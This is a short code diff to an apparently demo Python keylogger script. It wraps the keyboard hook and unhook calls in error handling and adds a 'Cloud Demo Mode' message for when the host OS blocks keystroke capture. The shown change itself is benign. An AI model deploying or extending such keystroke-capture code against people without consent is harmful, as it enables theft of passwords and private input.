@@ -66,14 +66,20 @@ def start_keylogger():
     """Attach the keyboard hook and set the running flag."""
     global running
     running = True
-    keyboard.hook(on_key_event)
+    try:
+        keyboard.hook(on_key_event)
+    except Exception as e:
+        print(f"Cloud Demo Mode: Hardware keylogging blocked by host OS ({e})")
 
 
 def stop_keylogger():
     """Detach all keyboard hooks and stop logging."""
     global running
     running = False
-    keyboard.unhook_all()
+    try:
+        keyboard.unhook_all()
+    except Exception:
+        pass
 
 
 def clear_logs():
